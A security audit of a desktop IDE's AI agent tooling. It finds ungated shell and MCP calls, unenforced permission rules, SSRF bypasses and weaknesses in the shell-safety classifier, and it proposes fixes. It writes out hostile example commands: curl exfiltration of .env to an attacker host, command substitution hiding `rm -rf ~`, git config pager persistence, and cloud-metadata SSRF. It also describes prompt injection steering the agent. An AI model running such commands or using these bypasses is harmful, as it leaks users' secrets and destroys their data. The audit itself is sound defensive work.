## CRITICAL

### C1. Native turn loop runs Shell with NO approval prompt and NO permission check
`apps/desktop/src-tauri/src/ai_turn.rs:1215-1227` (Shell arm of `execute_tool`)

The native Rust turn loop is the only live orchestration path in the shipped app.
Every other side-effecting tool (Write, Delete, PatchEngine, SshExec, Browser) calls
`require_tool_approval` first; the Shell arm calls `ai_tools::ai_shell` directly with
no gate, in **every** approval mode. The only guard is `classify_shell_command` РІР‚вЂќ a
catastrophic-pattern denylist, not an allowlist. A prompt-injected model (malicious
file/web/MCP content) emits `curl -d @.env https://attacker`, `git push attacker`,
`npm i malicious-pkg` РІР‚вЂќ none catastrophic РІР‚вЂќ and it runs silently.
**Fix:** call `require_tool_approval` in the Shell arm; auto-approve only when
`classify_shell_command` reports `read_only` (mirror the TS `autoApproveOnDefault`).

### C2. User-configured permission rules (deny/allow) never enforced on the native path
`ai_turn.rs:2957-2999` (`require_tool_approval`); engine `ai_permissions::evaluate`
only called from `ai_permission_decide` (`ai_permissions.rs:167`)

The deny>ask>allow rule engine is invoked only from the legacy TS path (dev-only
browser preview). The shipped app runs `runNativeChatTurn` РІвЂ вЂ™ `ai_run_turn`, whose
`require_tool_approval` never reads `ai.permissions` at all. The Settings UI advertises
`deny:Write(*.env)`, `deny:Shell(curl *)`, `deny:Delete(*)` as hard blocks; on the
only runtime users run, they get zero enforcement. The comment at `ai_turn.rs:1147`
("deny permission rules are enforced separately") is false.
**Fix:** thread `toolPermissionRules` into `TurnInput`; `require_tool_approval` calls
`ai_permissions::evaluate` first РІР‚вЂќ Deny РІвЂ вЂ™ Err unconditionally, Allow РІвЂ вЂ™ skip prompt.
Centralize so Shell/MCP/all arms inherit it.

## HIGH

- **H1. WebFetch SSRF guard fully bypassable via model-supplied `allowPrivateHosts`** РІР‚вЂќ
  `ai_turn.rs:1574-1586` РІвЂ вЂ™ `web_fetch.rs:54-57,81-83` (also Tauri cmd `lib.rs:434`).
  Prompt-injection reaches `http://169.254.169.254/...` (cloud IAM creds), localhost
  admin ports, LAN РІР‚вЂќ model alone decides to disable the control. **Fix:** drop the
  bypass from the schema + command; hard-code `false`, gate local targets behind a
  user host-allowlist.
- **H2. DNS rebinding / TOCTOU** РІР‚вЂќ `web_fetch.rs:212-238`. Guard does its own
  `to_socket_addrs()`; reqwest re-resolves independently at connect. Short-TTL DNS
  serves public IP to guard, private to connect. **Fix:** resolve once, validate all
  IPs, pin via `ClientBuilder::resolve`.
- **H3. Redirect guard blind to DNS names resolving to private IPs** РІР‚вЂќ
  `web_fetch.rs:170-190`. Sync redirect callback can't do DNS, blocks only literal
  `localhost`/IPs. `302 РІвЂ вЂ™ http://internal.corp/` (A record 10.x) connects. **Fix:**
  `Policy::none()`, follow manually with per-hop IP-pinned `reject_private_host`.
- **H4. Command substitution/backticks bypass `read_only` auto-approval** РІР‚вЂќ
  `ai_shell_safety.rs:87-134,353-401`. `split_segments` ignores `$(...)`, backticks,
  `${}`, `<()`; classify by first token only. `cat "$(rm -rf ~)"` РІвЂ вЂ™ `read_only=true`,
  auto-approved. **Fix:** clear `read_only` on any substitution/metachar.
- **H5. `git config` classified read-only** РІР‚вЂќ `ai_shell_safety.rs:363-385`.
  `git config core.pager 'rm -rf ~'` (or `core.sshCommand`, `core.hooksPath`,
  `alias.*=!cmd`) auto-approves; persisted RCE on next git op; `--global` poisons every
  repo. **Fix:** drop `config` from allowlist (or only with read flags).
- **H6. `rm -rf` catastrophic block defeated by quoting + system dirs** РІР‚вЂќ
  `ai_shell_safety.rs:234-248`. `rm -rf "/"`, `rm -rf "$HOME"` (quotes kept in compare)
  and `/etc /usr /bin /boot /home/*` (not in danger set) all pass. **Fix:** strip
  quotes/trailing slash, fold `$HOME`, expand dangerous-dir regex.
- **H7. MCP tool calls proxied with no approval, no permission check** РІР‚вЂќ
  `ai_turn.rs:1158-1165`; `mcp.rs:239`. Malicious/opaque MCP tools (fs/shell/net) fire
  with zero prompt, no workspace requirement. **Fix:** route through
  `require_tool_approval` + permission engine.
- **H8. Unbounded Vec from attacker-controlled `tool_call` index (OOM/abort)** РІР‚вЂќ
  `ai_chat_backend.rs:730-738`. `index` via `usize::try_from(u64).unwrap_or(0)` then
  `while len <= index { push }`. Hostile endpoint streams `{"index":4e9}` РІвЂ вЂ™ ~288 GB РІвЂ вЂ™
  process abort. **Fix:** clamp `index.min(len)` or hard ceiling.
- **H9. Debug adapter children orphaned on plain app quit** РІР‚вЂќ
  `crates/aspect-dap/src/lib.rs:79-102`; `lib.rs:777-787`. No `kill_on_drop`/`Drop`;
  `stop_all` runs only from workspace open/close, not `ExitRequested`; window destroy
  skips `workspace_close`. codelldb/debugpy + debuggee survive IDE exit. **Fix:**
  `.kill_on_drop(true)` + wire `stop_all` into `ExitRequested`.
- **H10. Spreadsheet preview has no decompression-bomb guard (OOM)** РІР‚вЂќ
  `crates/aspect-file-intel/src/lib.rs:263-310`. `spreadsheet_preview` fully materializes
  the sheet before `.take()` caps; sibling editor path already has
  `guard_decompression_bomb`, preview doesn't. ~1 KB xlsx РІвЂ вЂ™ GBs on `InspectFile`.
  **Fix:** call the same guard first.
- **H11. One corrupt `settings.json` silently wipes ALL settings, then persists empty** РІР‚вЂќ
  `crates/aspect-settings/src/lib.rs:32` (+`:94` recent_workspaces).
  `from_str(...).unwrap_or_default()` РІвЂ вЂ™ empty map on any parse error; next
  `settings_set()` makes loss permanent. **Fix:** log + rename to `.corrupt-<ts>` +
  refuse overwrite.
- **H12 (orig-critical, re-rated high). No checksum/signature on downloaded runtimes** РІР‚вЂќ
  `runtime_provision.rs:455-741`. Node/Go/Rust/Python fetched then extracted to
  PATH-prepended dirs / executed (`rustup-init`, `get-pip.py`) with zero integrity
  check. HTTPS-only narrows to trusted-CA-interceptor / CDN-compromise, but the
  defense-in-depth layer is missing (all vendors publish checksums). **Fix:** pin
  per-triple SHA256, verify before extract/exec.

## Themes

1. **Two enforcement paths, one dead.** All approval + permission-rule enforcement
   lives in the TS path that runs *only* in dev browser preview; the shipped native
   Rust turn loop leaves Shell (C1), permission rules (C2), and MCP (H7) ungated. The
   UI advertises controls the live path ignores. Fix the native loop centrally.
2. **Model/caller-controlled security toggles.** `allowPrivateHosts` (H1) and shell
   `read_only` (H4/H5/H6) are flipped off by prompt-injectable input. Security state
   must never be a caller/model argument.
3. **SSRF guard structurally unsound.** H1/H2/H3 + M3 share one root: DNS lookup
   decoupled from reqwest's connect, DNS-blind redirect callback, unbounded body. One
   architecture fix: IP-pinned resolution + manual redirects + streaming caps.
4. **"Materialize everything, then cap."** Recurring OOM shape: ssh_exec (M2), web
   body (M3), tool-call index (H8), spreadsheet (H10), DAP/LSP buffers (M8),
   ai_read_file (L). Bound *before*/*during* the read.
5. **Silent `unwrap_or_default` swallowing.** Settings wipe (H11), recent-workspaces,
   skill abort, get-pip silence, round-limit stale answer, BOM loss, dropped SSE/DAP
   events.
6. **Path handling trusts the wrong side.** `root.join(attacker_path)`, symlink-following
   skill reads, scp per-file names. Need a shared canonicalize + `starts_with(root)` +
   reject-symlink helper.
7. **Lifecycle leaks on quit.** DAP children (H9), detached cache writes, debug-session
   map growth, MCP oneshots РІР‚вЂќ teardown wired to workspace open/close, not
   `ExitRequested`; `tokio::process::Child` doesn't kill on drop.

## Overall

Architecturally well-built; the *intended* security model is thoughtful (approval
modes, permission engine, SSRF guards, decompression-bomb guards, command denylist,
sandboxed WASM). The problem is **enforcement gaps between intent and the live code
path** РІР‚вЂќ most acutely that the whole approval/permission layer is bypassed on the only
runtime users run. **Do not ship a release without fixing critical + high.**

### Release blockers
1. **C1 + C2 + H7** РІР‚вЂќ wire `require_tool_approval` + `ai_permissions::evaluate` into the
   native turn loop for Shell, MCP, all arms (one centralized fix, closes three holes).
2. **H1** РІР‚вЂќ remove model-controlled `allowPrivateHosts`.
3. **H2 + H3 + M3** РІР‚вЂќ re-architect web fetch: IP-pinned DNS, manual redirects, streaming cap.
4. **H4 + H5 + H6** РІР‚вЂќ harden `ai_shell_safety`.
5. **H8** РІР‚вЂќ clamp streamed tool-call index (one line).
6. **H11** РІР‚вЂќ stop `unwrap_or_default` wiping settings.
7. **H12** РІР‚вЂќ checksum runtime downloads.
8. **H9** РІР‚вЂќ `kill_on_drop(true)` on debug adapters + wire teardown into `ExitRequested`.
9. **H10** РІР‚вЂќ decompression-bomb guard on the spreadsheet preview path.

### Clean / well-contained
WASM extension sandbox is genuinely fail-closed (guards bind to executed bytes). MCP
transport lifecycle mostly self-healing. Frontend chat-history mostly self-heals (but
UI layer under-covered РІР‚вЂќ see note). 12 findings refuted under verification, incl.
"headline" claims that didn't survive (workspace-scoped settings injection,
AI-writable settings, broad SearxNG redirect SSRF, CRLF whole-file corruption).
